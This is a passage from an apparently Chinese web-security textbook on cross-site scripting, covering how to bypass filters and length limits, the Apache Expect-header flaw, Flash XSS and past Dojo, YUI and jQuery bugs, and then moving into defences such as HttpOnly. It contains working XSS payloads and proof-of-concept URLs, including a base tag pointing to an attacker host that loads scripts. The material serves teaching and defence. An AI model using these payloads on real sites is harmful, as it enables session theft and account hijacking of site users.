<p>提交的数据包在Firefox下得到如下效果：</p>
<p>在Firefox下的效果</p>
<p>这两个字节：<kbd><code>%c1\</code></kbd>组成了一个新的Unicode字符，<kbd><code>%c1</code></kbd>把转义符号<kbd><code>\</code></kbd>给“吃掉了”，从而绕过了系统的安全检查，成功实施了<kbd><code>XSS</code></kbd>攻击。</p>
<p>绕过长度限制</p>
<p>很多时候，产生XSS的地方会有变量的长度限制，这个限制可能是服务器端逻辑造成的。假设下面代码存在一个XSS漏洞：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">"$var"</span> /&gt;</span></div></pre></td></tr></table></figure>
<p>服务器端如果对输出变量<kbd>$var</kbd>做了严格的长度限制，那么攻击者可能会这样构造XSS：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$var为： &quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>希望达到的输出效果是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" /&gt;</div></pre></td></tr></table></figure>
<p>假设长度限制为20个字节，则这段XSS会被切割为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line"></div><div class="line">$var 输出为： &quot;&gt;&lt;script&gt; alert(/xss</div></pre></td></tr></table></figure>
<p>连一个完整的函数都无法写完，XSS攻击可能无法成功。那此时，是不是万事大吉了呢？答案是否定的。<br>攻击者可以利用事件（Event）来缩短所需要的字节数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$var 输出为： &quot;onclick=alert(1)//</div><div class="line">加上空格符，刚好够20个字节，实际输出为：</div><div class="line">&lt;input type=text value=&quot;&quot; onclick=alert(1)// &quot;/&gt;</div><div class="line">当用户点击了文本框后，alert()将执行.</div></pre></td></tr></table></figure>
<p>但利用“事件”能够缩短的字节数是有限的。最好的办法是把<kbd>XSS Payload</kbd> 写到别处，再通过简短的代码加载这段<kbd>XSS Payload </kbd> 。</p>
<p>最常用的一个“藏代码”的地方，就是<kbd>location.hash</kbd>  。而且根据HTTP协议，location.hash的内容不会在HTTP包中发送，所以服务器端的Web日志中并不会记录下<kbd>location.hash</kbd> 里的内容，从而也更好地隐藏了黑客真实的意图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$var 输出为： &quot; onclick=&quot;eval(location.hash.substr(1))</div></pre></td></tr></table></figure>
<p>总共是40个字节。输出后的HTML是：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">"eval(location.hash.substr(1)) "</span> /&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--因为location.hash的第一个字符是 # ，所以必须去除第一个字符才行。此时构造出的XSS URL为：--&gt;</span></div><div class="line">http://www.a.com/test.html#alert(1)</div></pre></td></tr></table></figure>
<p>用户点击文本框时，<kbd><code>location.hash</code></kbd>  里的代码执行了。</p>
<p><kbd><code>location.hash</code></kbd> 本身没有长度限制，但是浏览器的地址栏是有长度限制的，不过这个长度已经足够写很长的<kbd>XSS Payload</kbd> 了。要是地址栏的长度也不够用，还可以再使用加载远程JS的方法，来写更多的代码。</p>
<p>在某些环境下，可以利用注释符绕过长度限制。<br>比如我们能控制两个文本框，第二个文本框允许写入更多的字节。此时可以利用HTML的“注释符号”，把两个文本框之间的HTML代码全部注释掉，从而“打通”两个<code>&lt;input&gt;</code> 标签。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">xxxxxxxxxxxxx</div><div class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">在第一个input框中，输入：</div><div class="line"> &quot;&gt;&lt;!--</div><div class="line">在第二个input框中，输入：--&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;</div><div class="line">最终的效果是：</div><div class="line">&lt;input id=1 type=&quot;text&quot; value=&quot;&quot;&gt;&lt;!--&quot; /&gt;</div><div class="line">xxxxxxxxxxxxxxxxx</div><div class="line">&lt;input id=2 type=&quot;text&quot; value=&quot;--&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&quot; /&gt;</div><div class="line">中间的代码全部被</div><div class="line">&lt;!--  … --&gt;</div></pre></td></tr></table></figure>
<p>给注释掉了！</p>
<p>而在第一个input框中，只用到了短短的6个字节！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">使用&lt;base&gt;标签</div><div class="line">&lt;base&gt;标签并不常用，它的作用是定义页面上的所有使用“相对路径”标签的hosting地址。</div><div class="line">比如，打开一张不存在的图片：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;img src=&quot;/intl/en_ALL/images/srpr/logo1w.png&quot; /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">测试页面</div><div class="line">这张图片实际上是Google的一张图片，原地址为：http://www.google.com/intl/en_ALL/images/srpr/logo1w.png</div><div class="line">在&lt;img&gt;标签前加入一个&lt;base&gt;标签：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;base href=&quot;http://www.google.com&quot; /&gt;</div><div class="line">&lt;img src=&quot;/intl/en_ALL/images/srpr/logo1w.png&quot; /&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;base&gt;标签将指定其后的标签默认从“http://www.google.com”取URL：</div><div class="line">测试页面图片被找到了。</div><div class="line">需要特别注意的是，在有的技术文档中，提到&lt;base&gt;标签只能用于&lt;head&gt;标签之内，其实这是不对的。&lt;base&gt;标签可以出现在页面的任何地方，并作用于位于该标签之后的所有标签。</div><div class="line">攻击者如果在页面中插入了&lt;base&gt;标签，就可以通过在远程服务器上伪造图片、链接或脚本，劫持当前页面中的所有使用“相对路径”的标签。比如：</div><div class="line">&lt;base href=&quot;http://www.evil.com&quot; /&gt;</div><div class="line">….</div><div class="line">&lt;script src=&quot;x.js&quot; &gt;&lt;/script&gt;</div><div class="line">….</div><div class="line">&lt;img src=&quot;y.jpg&quot; /&gt;</div><div class="line">…</div><div class="line">&lt;a href=&quot;auth.do&quot; &gt;auth&lt;/a&gt;</div><div class="line">所以在设计XSS安全方案时，一定要过滤掉这个非常危险的标签。</div></pre></td></tr></table></figure>
<hr>

<p><kbd><code>window.name</code></kbd> 的妙用</p>
<p><kbd><code>window.name</code></kbd> 对象是一个很神奇的东西。对当前窗口的<kbd><code>window.name</code></kbd> 对象赋值，没有特殊字符的限制。因为window对象是浏览器的窗体，而并非document对象，因此很多时候window对象不受同源策略的限制。攻击者利用这个对象，可以实现跨域、跨页面传递数据。在某些环境下，这种特性将变得非常有用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">参考以下案例。假设“www.a.com/test.html”的代码为：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">window.name = &quot;test&quot;;</div><div class="line">alert(document.domain+&quot;    &quot;+window.name);</div><div class="line">window.location = &quot;http://www.b.com/test1.html&quot;;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">这段代码将window.name赋值为test，然后显示当前域和window.name的值，最后将页面跳转到“www.b.com/test1.html”。</div><div class="line">“www.b.com/test1.html”的代码为：</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">alert(document.domain+&quot;    &quot;+window.name);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>这里显示了当前域和<kbd><code>window.name</code></kbd> 的值。最终效果如下，访问“www.a.com/test.html”：</p>
<p>测试页面<br><kbd><code>window.name</code></kbd> 赋值成功，然后页面自动跳转到”www.b.com/test1.html”：</p>
<p>测试页面<br>这个过程实现数据的跨域传递：“test”这个值从www.a.com传递到www.b.com。</p>
<p>使用<kbd>window.name</kbd> 可以缩短 <code>XSS Payload</code>的长度，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">window</span>.name = <span class="string">"alert(document.cookie)"</span>;</div><div class="line">locaton.href = <span class="string">"http://www.xssedsite.com/xssed.php"</span>;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在同一窗口打开XSS的站点后，只需通过XSS执行以下代码即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">eval(name);</div></pre></td></tr></table></figure>
<p>只有11个字节，短到了极点。</p>
<p>这个技巧为安全研究者luoluo所发现，同时他还整理了很多绕过XSS长度限制的技巧。</p>
<p><hr></p>
<h3 id="3-2-7-变废为宝：Mission-Impossible"><a href="#3-2-7-变废为宝：Mission-Impossible" class="headerlink" title="3.2.7 变废为宝：Mission Impossible"></a>3.2.7 变废为宝：<kbd>Mission Impossible</kbd></h3><p>从XSS漏洞利用的角度来看，存储型XSS对攻击者的用处比反射型XSS要大。因为存储型XSS在用户访问正常URL时会自动触发；而反射型XSS会修改一个正常的URL，一般要求攻击者将XSS URL发送给用户点击，无形中提高了攻击的门槛。</p>
<p>而有的XSS漏洞，则被认为只能够攻击自己，属于“鸡肋”漏洞。但随着时间的推移，数个曾经被认为是无法利用的XSS漏洞，都被人找到了利用方法。</p>
<p><hr></p>
<h3 id="3-2-7-1-Apache-Expect-Header-XSS"><a href="#3-2-7-1-Apache-Expect-Header-XSS" class="headerlink" title="3.2.7.1　Apache Expect Header XSS"></a>3.2.7.1　Apache Expect Header XSS</h3><p>“Apache Expect Header XSS”漏洞最早公布于2006年。这个漏洞曾一度被认为是无法利用的，所以厂商不认为这是个漏洞。这个漏洞的影响范围是：Apache Httpd Server版本1.3.34、2.0.57、2.2.1及以下。漏洞利用过程如下。</p>
<p>向服务器提交：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET / HTTP/1.1</div><div class="line">Accept: */*</div><div class="line">Accept-Language: en-gb</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Expect: &lt;script&gt;alert(&apos;http://www.whiteacid.org is vulnerable to the Expect Header</div><div class="line">vulnerability.&apos;);&lt;/script&gt;</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET</div><div class="line">CLR 1.1.4322)</div><div class="line">Host: www.whiteacid.org</div><div class="line">Connection: Keep-Alive</div></pre></td></tr></table></figure>
<p>服务器返回：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">HTTP/1.1 417 Expectation Failed</div><div class="line">Date: Thu, 21 Sep 2006 20:44:52 GMT</div><div class="line">Server: Apache/1.3.33 (Unix) mod_throttle/3.1.2 DAV/1.0.3 mod_fastcgi/2.4.2</div><div class="line">mod_gzip/1.3.26.1a PHP/4.4.2 mod_ssl/2.8.22 OpenSSL/0.9.7e</div><div class="line">Keep-Alive: timeout=5, max=100</div><div class="line">Connection: Keep-Alive</div><div class="line">Transfer-Encoding: chunked</div><div class="line">Content-Type: text/html; charset=iso-8859-1</div><div class="line">1ba</div><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;HTML&gt;&lt;HEAD&gt;</div><div class="line">&lt;TITLE&gt;417 Expectation Failed&lt;/TITLE&gt;</div><div class="line">&lt;/HEAD&gt;&lt;BODY&gt;</div><div class="line">&lt;H1&gt;Expectation Failed&lt;/H1&gt;</div><div class="line">The expectation given in the Expect request-header</div><div class="line">field could not be met by this server.&lt;P&gt;</div><div class="line">The client sent&lt;PRE&gt;</div><div class="line">Expect: &lt;script&gt;alert(&apos;http://www.whiteacid.org is vulnerable to the Expect Header</div><div class="line">vulnerability.&apos;);&lt;/script&gt;</div><div class="line">&lt;/PRE&gt;</div><div class="line">but we only allow the 100-continue expectation.</div><div class="line">&lt;/BODY&gt;&lt;/HTML&gt;</div><div class="line">0</div></pre></td></tr></table></figure>
<p>注意到服务器在出错返回时，会把Expect头的内容未经任何处理便写入到页面中，因此Expect头中的HTML代码就被浏览器解析执行了。这是Apache的漏洞，影响范围相当广。从这个攻击过程可以看出，需要在提交请求时向HTTP头中注入恶意数据，才能触发这个漏洞。但对于XSS攻击来说，JavaScript工作在渲染后的浏览器环境中，无法控制用户浏览器发出的HTTP头。因此，这个漏洞曾经一度被认为是“鸡肋”漏洞。</p>
<p>后来安全研究者Amit Klein提出了“使用Flash构造请求”的方法，成功地利用了这个漏洞，变废为宝！</p>
<p>在Flash中发送HTTP请求时，可以自定义大多数的HTTP头。如下是Amit Klein的演示代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">//Credits to Amit Klein as he wrote this, I just decompiled it</div><div class="line">inURL = this._url;</div><div class="line">inPOS = inURL.lastIndexOf(&quot;?&quot;);</div><div class="line">inParam = inURL.substring(inPOS + 1, inPOS.length);</div><div class="line">req = new LoadVars();</div><div class="line">req.addRequestHeader(&quot;Expect&quot;, &quot;&lt;script&gt;alert(\&apos;&quot; + inParam + &quot; is vulnerable to the</div><div class="line">Expect Header vulnerability.\ &apos;);&lt;/script&gt;&quot;);</div><div class="line">req.send(inParam, &quot;_blank&quot;, &quot;POST&quot;);</div></pre></td></tr></table></figure>
<p>正因为此，Flash在新版本中禁止用户自定义发送Expect头。但后来发现可以通过注入HTTP头的方式绕过这个限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">req.addRequestHeader(&quot;Expect:FooBar&quot;,&quot;&lt;script&gt;alert(&apos;XSS&apos;)&lt;/script&gt;&quot;);</div></pre></td></tr></table></figure>
<p>目前Flash已经修补好了这些问题。<br>此类攻击，还可以通过Java Applet等构造HTTP请求的第三方插件来实现。</p>
<p><hr><br>Anehta的回旋镖</p>
<p>反射型XSS也有可能像存储型XSS一样利用：将要利用的反射型XSS嵌入一个存储型XSS中。这个攻击技巧，曾经在笔者实现的一个XSS攻击平台（Anehta）中使用过，笔者将其命名为“回旋镖”。<br>因为浏览器同源策略的原因，XSS也受到同源策略的限制——发生在A域上的XSS很难影响到B域的用户。<br>回旋镖的思路就是：如果在B域上存在一个反射型“XSS_B”，在A域上存在一个存储型“XSS_A”，当用户访问A域上的“XSS_A”时，同时嵌入B域上的“XSS_B”，则可以达到在A域的XSS攻击B域用户的目的。</p>
<p>我们知道，在IE中，<kbd><code>&lt;iframe&gt;、&lt;img&gt;、&lt;link&gt;</code> <kbd> 等标签都会拦截“第三方Cookie”的发送，而在Firefox中则无这种限制（第三方Cookie即指保存在本地的Cookie，也就是服务器设置了expire时间的Cookie）。</kbd></kbd></p>
<p>所以，对于Firefox来说，要实现回旋镖的效果非常简单，只需要在XSS_A处嵌入一个iframe即可：<code>&lt;iframe src=&quot;http://www.b.com/?xss.... &quot; &gt;&lt;/iframe&gt;</code><br>但是对于IE来说，则要麻烦很多。为了达到执行XSS_B的目的，可以使用一个<form>标签，在浏览器提交form表单时，并不会拦截第三方Cookie的发送。</form></p>
<p>因此，先在XSS_A上写入一个<kbd><code>&lt;form&gt;</code></kbd> ，自动提交到XSS_B，然后在XSS_B中再跳转回原来的XSS_A，即完成一个“回旋镖”的过程。但是这种攻击的缺点是，尽管跳转花费的时间很短，但用户还是会看到浏览器地址栏的变化。</p>
<p>如果能在B域上找到一个302跳转的页面，也可以不使用form表单，这样会更加方便。<br>虽然“回旋镖”并不是一种完美的漏洞利用方式，但也能将反射型XSS的效果变得更加自动化。<br>XSS漏洞是一个Web安全问题，不能因为它的利用难易程度而决定是否应该修补。随着技术的发展，某些难以利用的漏洞，也许不再是难题。</p>
<p><hr></p>
<h3 id="3-2-8-容易被忽视的角落：-Flash-XSS"><a href="#3-2-8-容易被忽视的角落：-Flash-XSS" class="headerlink" title="3.2.8 容易被忽视的角落： Flash XSS "></a>3.2.8 容易被忽视的角落：<kbd> Flash XSS </kbd></h3><p>前文讲到的XSS攻击都是基于HTML的，其实在Flash中同样也有可能造成XSS攻击。<br>在Flash中是可以嵌入ActionScript脚本的。一个最常见的Flash XSS可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">getURL(&quot;javascript:alert(document.cookie)&quot;)</div><div class="line">将Flash嵌入页面中：</div><div class="line">&lt;embed src=&quot;http://yourhost/evil.swf&quot;</div><div class="line">pluginspage=&quot;http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=S</div><div class="line">hockwaveFlash&quot;</div><div class="line">type=&quot;application/x-shockwave-flash&quot;</div><div class="line">width=&quot;0&quot;</div><div class="line">height=&quot;0&quot;</div><div class="line">&gt;&lt;/embed&gt;</div><div class="line">&gt;ActionScript是一种非常强大和灵活的脚本，甚至可以使用它发起网络连接，因此应该尽可能地禁止用户能够上传或加载自定义的Flash文件。</div><div class="line">&gt;</div></pre></td></tr></table></figure>
<p>2016-04-06</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">由于Flash文件如此危险，所以在实现XSS Filter时，一般都会禁用&lt;embed&gt;、&lt;object&gt;等标签。后者甚至可以加载ActiveX控件，能够产生更为严重的后果。</div><div class="line"></div><div class="line"></div><div class="line">如果网站的应用一定要使用Flash怎么办？一般来说，如果仅仅是视频文件，则要求转码为“flv文件”。flv文件是静态文件，不会产生安全隐患。如果是带动态脚本的Flash，则可以通过Flash的配置参数进行限制。</div><div class="line"></div><div class="line"></div><div class="line">&gt;常见的嵌入Flash的代码如下：</div><div class="line">&gt;&lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot;</div><div class="line">&gt;codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#versi</div><div class="line">&gt;on=8,0,0,0&quot;</div><div class="line">&gt;name=&quot;Main&quot; width=&quot;1000&quot; height=&quot;600&quot; align=&quot;middle&quot; id=&quot;Main&quot;&gt;</div><div class="line"></div><div class="line">&lt;embed flashvars=&quot;site=&amp;sitename=&quot; src=&apos;Loading.swf?user=453156346&apos; width=&quot;1000&quot;</div><div class="line">height=&quot;600&quot; align=&quot;middle&quot; quality=&quot;high&quot; name=&quot;Main&quot; allowscriptaccess=&quot;sameDomain&quot;</div><div class="line">type=&quot;application/x-shockwave-flash&quot;</div><div class="line">pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot; /&gt;</div><div class="line"></div><div class="line">&lt;/object&gt;</div></pre></td></tr></table></figure>
<p>限制Flash动态脚本的最重要的参数是“allowScriptAccess”，这个参数定义了Flash能否与HTML页面进行通信。它有三个可选值：<br>always，对与HTML的通信也就是执行JavaScript不做任何限制；<br>sameDomain，只允许来自于本域的Flash与Html通信，这是默认值；<br>never，绝对禁止Flash与页面通信。<br>使用always是非常危险的，一般推荐使用never。如果值为sameDomain的话，请务必确保Flash文件不是用户传上来的。</p>
<p><code>allowNetworking</code>也非常关键，这个参数能控制Flash与外部网络进行通信。它有三个可选值：<br>all，允许使用所有的网络通信，也是默认值；<br>internal，Flash不能与浏览器通信如navigateToURL，但是可以调用其他的API；<br>none，禁止任何的网络通信。<br>一般建议此值设置为none或者internal。设置为all可能带来安全问题。</p>
<p>除了用户的Flash文件能够实施脚本攻击外，一些Flash也可能会产生XSS漏洞。看如下ActionScript代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">on (release) &#123;</div><div class="line">getURL (_root.clickTAG, &quot;_blank&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码经常出现在广告的Flash中，用于控制用户点击后的URL。但是这段代码缺乏输入验证，可以被XSS攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://url/to/flash-file.swf?clickTAG=javascript:alert(&apos;xss&apos;)</div></pre></td></tr></table></figure>
<p>安全研究者Stefano Di Paola曾经写了一个叫“SWFIntruder”的工具来检测产生在Flash里的XSS漏洞，通过这个工具可以检测出很多注入Flash变量导致的XSS问题。</p>
<p>要修补本例中的漏洞，可以使用输入检查的方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">on (release) &#123;</div><div class="line">  <span class="keyword">if</span> (_root.clickTAG.substring(<span class="number">0</span>,<span class="number">5</span>)== <span class="string">"http:"</span> ||</div><div class="line">  _root.clickTAG.substring(<span class="number">0</span>,<span class="number">6</span>)== <span class="string">"https:"</span> ||</div><div class="line">  _root.clickTAG.substring(<span class="number">0</span>,<span class="number">1</span>)== <span class="string">"/"</span>) &#123;</div><div class="line">    getURL (_root.clickTAG, <span class="string">"_blank"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Flash XSS往往被开发者所忽视。注入Flash变量的XSS，因为其问题出现在编译后的Flash文件中，一般的扫描工具或者代码审计工具都难以检查，常常使其成为漏网之鱼。<br>OWASP为Flash安全研究设立了一个Wiki页面，有兴趣的读者可以参考。</p>
<p> 3.2.9 真的高枕无忧吗：JavaScript开发框架</p>
<p>在Web前端开发中，一些JavaScript开发框架深受开发者欢迎。利用JavaScript开发框架中的各种强大功能，可以快速而简洁地完成前端开发。<br>一般来说，成熟的JavaScript开发框架都会注意自身的安全问题。但是代码是人写的，高手偶尔也会犯错。一些JavaScript开发框架也曾暴露过一些XSS漏洞。</p>
<p>DojoDojo是一个流行的JavaScript开发框架，它曾被发现存在XSS漏洞。在Dojo 1.4.1中，存在两个“DOM Based XSS”：<br>File: dojo-release-1.4.1-src\dojo-release-1.4.1-src\dijit\tests_testCommon.js<br>用户输入由theme参数传入，然后被赋值给变量themeCss，最终被document.write到页面里：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> str = <span class="built_in">window</span>.location.href.substr(<span class="built_in">window</span>.location.href.indexOf(<span class="string">"?"</span>)+<span class="number">1</span>).split(<span class="regexp">/#/</span>);</div><div class="line"><span class="keyword">var</span> themeCss = d.moduleUrl(<span class="string">"dijit.themes"</span>,theme+<span class="string">"/"</span>+theme+<span class="string">".css"</span>);</div><div class="line"><span class="keyword">var</span> themeCssRtl = d.moduleUrl(<span class="string">"dijit.themes"</span>,theme+<span class="string">"/"</span>+theme+<span class="string">"_rtl.css"</span>);</div><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;link rel="stylesheet" type="text/css" href="'</span>+themeCss+<span class="string">'"&gt;'</span>);</div><div class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;link rel="stylesheet" type="text/css" href="'</span>+themeCssRtl+<span class="string">'"&gt;'</span>);</div></pre></td></tr></table></figure>
<p>所以凡是引用了_testCommon.js的文件，都受影响。POC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://WebApp/dijit/tests/form/test_Button.html?theme=&quot;/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div><div class="line">类似的问题还存在于：</div><div class="line"></div><div class="line">File: dojo-release-1.4.1-src\dojo-release-1.4.1-src\util\doh\runner.html</div><div class="line">它也是从window.location传入了用户能够控制的数据，最终被document.write到页面：</div><div class="line">Line 40:</div><div class="line">var qstr = window.location.search.substr(1);</div><div class="line"></div><div class="line"></div><div class="line">Line 64:</div><div class="line">document.write(&quot;&lt;scr&quot;+&quot;ipt type=&apos;text/javascript&apos; djConfig=&apos;isDebug: true&apos;</div><div class="line">src=&apos;&quot;+dojoUrl+&quot;&apos;&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;);</div><div class="line">..snip..</div><div class="line">document.write(&quot;&lt;scr&quot;+&quot;ipt type=&apos;text/javascript&apos; src=&apos;&quot;+testUrl+&quot;.js&apos;&gt;&lt;/scr&quot;+&quot;ipt&gt;&quot;);</div><div class="line">POC如下：</div><div class="line">http://WebApp/util/doh/runner.html?dojoUrl=&apos;/&gt;foo&lt;/script&gt;&lt;&apos;</div><div class="line">&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>这些问题在Dojo 1.4.2版本中已经得到修补。但是从这些漏洞可以看到，使用JavaScript开发框架也并非高枕无忧，需要随时关注可能出现的安全问题。</p>
<p><hr></p>
<h3 id="YUI"><a href="#YUI" class="headerlink" title="YUI"></a>YUI</h3><p>翻翻YUI的bugtracker，也可以看到类似Dojo的问题。</p>
<p>在YUI 2.8.1中曾经fix过一个“DOM Based XSS”。YUI的History Manager功能中有这样一个问题，打开官方的demo页：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://developer.yahoo.com/yui/examples/history/history-navbar_source.html</div></pre></td></tr></table></figure>
<p>点击一个Tab页，等待页面加载完成后，在URL的hash中插入恶意脚本。构造的XSS如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://developer.yahoo.com/yui/examples/history/history-navbar_source.html#navbar=hom</div><div class="line">e&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>脚本将得到执行。其原因是在<code>history.js</code>的<code>_updateIframe</code>方法中信任了用户可控制的变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">html = &apos;&lt;html&gt;&lt;body&gt;&lt;div id=&quot;state&quot;&gt;&apos; + fqstate + &apos;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;;</div></pre></td></tr></table></figure>
<p>最后被写入到页面导致脚本执行。YUI的修补方案是对变量进行了htmlEscape。</p>
<p><hr></p>
<h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h3><p>jQuery可能是目前最流行的JavaScript框架。它本身出现的XSS漏洞很少。但是开发者应该记住的是，JavaScript框架只是对JavaScript语言本身的封装，并不能解决代码逻辑上产生的问题。所以开发者的意识才是安全编码的关键所在。<br>在jQuery中有一个html()方法。这个方法如果没有参数，就是读取一个DOM节点的innerHTML；如果有参数，则会把参数值写入该DOM节点的innerHTML中。这个过程中有可能产生</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">“DOM Based XSS”：$(&apos;div.demo-container&apos;).html(&quot;&lt;img src=# onerror=alert(1) /&gt;&quot;);</div></pre></td></tr></table></figure>
<p>如上，如果用户能够控制输入，则必然会产生XSS。在开发过程中需要注意这些问题。<br>使用JavaScript框架并不能让开发者高枕无忧，同样可能存在安全问题。除了需要关注框架本身的安全外，开发者还要提高安全意识，理解并正确地使用开发框架。</p>
<p><hr></p>
<h3 id="3-3-XSS的防御"><a href="#3-3-XSS的防御" class="headerlink" title="3.3 XSS的防御"></a>3.3 XSS的防御</h3><p>XSS的防御是复杂的。</p>
<p>流行的浏览器都内置了一些对抗XSS的措施，比如Firefox的CSP、Noscript扩展，IE 8内置的XSS Filter等。而对于网站来说，也应该寻找优秀的解决方案，保护用户不被XSS攻击。</p>
<p> 3.3.1 四两拨千斤：HttpOnly</p>
<p>HttpOnly</p>
<p>HttpOnly最早是由微软提出，并在IE 6中实现的，至今已经逐渐成为一个标准。浏览器将禁止页面的JavaScript访问带有HttpOnly属性的Cookie。<br>以下浏览器开始支持HttpOnly：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Microsoft IE 6 SP1+</div><div class="line">Mozilla Firefox 2.0.0.5+</div><div class="line">Mozilla Firefox 3.0.0.6+</div><div class="line">Google Chrome</div><div class="line">Apple Safari 4.0+</div><div class="line">Opera 9.5+</div></pre></td></tr></table></figure>
<p>严格地说，HttpOnly并非为了对抗XSS——HttpOnly解决的是XSS后的Cookie劫持攻击。<br>在“初探XSS Payload”一节中，曾演示过“如何使用XSS窃取用户的Cookie，然后登录进该用户的账户”。但如果该Cookie设置了HttpOnly，则这种攻击会失败，因为JavaScript读取不到Cookie的值。<br>一个Cookie的使用过程如下。<br>Step1：浏览器向服务器发起请求，这时候没有Cookie。<br>Step2：服务器返回时发送Set-Cookie头，向客户端浏览器写入Cookie。Step3：在该Cookie到期前，浏览器访问该域下的所有页面，都将发送该Cookie。<br>HttpOnly是在Set-Cookie时标记的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Set-Cookie: &lt;name&gt;=&lt;value&gt;[; &lt;Max-Age&gt;=&lt;age&gt;]</div><div class="line">[; expires=&lt;date&gt;][; domain=&lt;domain_name&gt;]</div><div class="line">[; path=&lt;some_path&gt;][; secure][; HttpOnly]</div></pre></td></tr></table></figure>
<p>需要注意的是，服务器可能会设置多个Cookie（多个key-value对），而HttpOnly可以有选择性地加在任何一个Cookie值上。<br>在某些时候，应用可能需要JavaScript访问某几项Cookie，这种Cookie可以不设置HttpOnly标记；而仅把HttpOnly标记给用于认证的关键Cookie。<br>HttpOnly的使用非常灵活。如下是一个使用HttpOnly的过程。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">header(&quot;Set-Cookie: cookie1=test1;&quot;);</div><div class="line">header(&quot;Set-Cookie: cookie2=test2;httponly&quot;, false);</div><div class="line"></div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">  alert(document.cookie);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
